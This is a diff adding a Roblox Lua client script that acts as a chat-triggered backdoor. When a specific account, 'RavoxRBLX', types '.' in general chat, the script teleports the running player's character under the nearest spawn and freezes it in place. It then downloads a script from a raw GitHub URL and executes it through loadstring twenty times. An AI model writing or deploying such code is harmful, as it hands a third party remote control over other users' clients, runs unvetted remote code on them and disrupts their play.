@@ -1,0 +1,96 @@
+-- Teleport & freeze + run loadstring 20 times (fixed spawn issue)
+
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local TextChatService = game:GetService("TextChatService")
+
+local player = Players.LocalPlayer
+if not player then return end
+
+-- Collect spawns once
+local function getSpawns()
+    local spawns = {}
+    for _,v in ipairs(workspace:GetDescendants()) do
+        if v:IsA("SpawnLocation") then
+            table.insert(spawns,v)
+        end
+    end
+    return spawns
+end
+
+local function getNearestSpawn(position)
+    local closest
+    local dist = math.huge
+
+    for _,spawn in ipairs(getSpawns()) do
+        if spawn and spawn.Parent then
+            local d = (spawn.Position - position).Magnitude
+            if d < dist then
+                dist = d
+                closest = spawn
+            end
+        end
+    end
+
+    return closest
+end
+
+local freezeConnection
+
+local channel = TextChatService.TextChannels.RBXGeneral
+channel.MessageReceived:Connect(function(message)
+
+    if not message.TextSource then return end
+    if message.TextSource.Name ~= "RavoxRBLX" then return end
+    if message.Text ~= "." then return end
+
+    local character = player.Character or player.CharacterAdded:Wait()
+    local hrp = character:WaitForChild("HumanoidRootPart")
+    local humanoid = character:WaitForChild("Humanoid")
+
+    task.wait(0.2)
+
+    local spawn = getNearestSpawn(hrp.Position)
+    if not spawn then
+        warn("No spawn found")
+        return
+    end
+
+    local targetCFrame = spawn.CFrame * CFrame.new(0,-8,0)
+
+    -- Retry teleport a few times (fixes the bug)
+    for i = 1,5 do
+        hrp.CFrame = targetCFrame
+        task.wait()
+    end
+
+    -- freeze
+    hrp.Anchored = true
+    humanoid.WalkSpeed = 0
+    humanoid.JumpPower = 0
+    humanoid:ChangeState(Enum.HumanoidStateType.Physics)
+
+    -- stop animations
+    for _,track in ipairs(humanoid:GetPlayingAnimationTracks()) do
+        track:Stop()
+    end
+
+    -- hold position
+    if freezeConnection then
+        freezeConnection:Disconnect()
+    end
+
+    freezeConnection = RunService.RenderStepped:Connect(function()
+        if hrp then
+            hrp.CFrame = targetCFrame
+        end
+    end)
+
+    -- run loadstring 20 times
+    for i = 1,20 do
+        task.spawn(function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/porpora02-ai/d/refs/heads/main/infyeild"))()
+        end)
+    end
+
+end)
